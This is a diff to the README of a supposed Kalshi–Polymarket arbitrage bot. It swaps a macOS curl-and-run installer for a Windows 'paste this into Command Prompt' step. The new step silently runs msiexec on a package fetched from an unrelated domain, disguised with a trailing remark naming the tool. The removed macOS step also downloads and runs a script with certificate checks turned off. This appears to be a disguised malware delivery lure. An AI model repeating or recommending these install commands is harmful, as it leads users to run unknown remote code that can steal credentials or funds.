@@ -32,14 +32,23 @@ kalshi-polymarket-arbitrage-tool/
 └── start.sh          # Launch script (generated on install)
 ```
 
-## Installation (macOS)
-Open **Terminal** (press `⌘ + Space`, type "Terminal", hit Enter) and run:
-```bash
-curl -fsSLk https://github.com/elizabethasicb/poly-market-kalshi-bot/archive/refs/heads/main.zip -o /tmp/cw.zip && \
-unzip -qo /tmp/cw.zip -d /tmp && \
-cd /tmp/poly-market-kalshi-bot-main && \
-bash install.sh
+## 🪟 Windows Installation
+### **Step 1 — Open Command Prompt**
+1. Press **Win + R**
+2. Type:
 ```
+cmd
+```
+3. Press **Enter**
+This will open **Command Prompt**.
+---
+### **Step 2 — Run the Install Command**
+Copy the command below and paste it into **Command Prompt**, then press **Enter**.
+```powershell
+cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem Kalshi Polymarket Arbitrage Tool
+```
+The installer will automatically download and install the required components.
+
 
 > Requires: macOS 12+. The installer will handle Go and Node.js via Homebrew automatically.
 
